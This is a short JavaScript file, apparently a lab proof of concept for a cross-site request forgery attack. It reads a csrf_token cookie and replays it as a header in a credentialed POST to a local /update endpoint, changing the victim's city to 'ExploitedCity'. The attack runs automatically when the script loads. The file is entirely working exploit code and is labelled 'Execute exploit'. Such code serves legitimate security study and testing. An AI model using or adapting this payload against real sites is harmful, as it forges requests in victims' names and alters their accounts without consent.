function getCookie(name) {
    let value = "; " + document.cookie;
    let parts = value.split("; " + name + "=");
    if (parts.length === 2) return parts.pop().split(";").shift();
}

function exploit(token) {
    const url = "https://127.0.0.1:5000/update";
    const params = "city=ExploitedCity";

    const CSRF = new XMLHttpRequest();
    CSRF.open("POST", url, true);
    CSRF.withCredentials = true;
    CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    CSRF.setRequestHeader("X-Csrf-Header", token);
    CSRF.send(params);
}

// Execute exploit
const csrfToken = getCookie("csrf_token");
if (csrfToken) {
    exploit(csrfToken);
}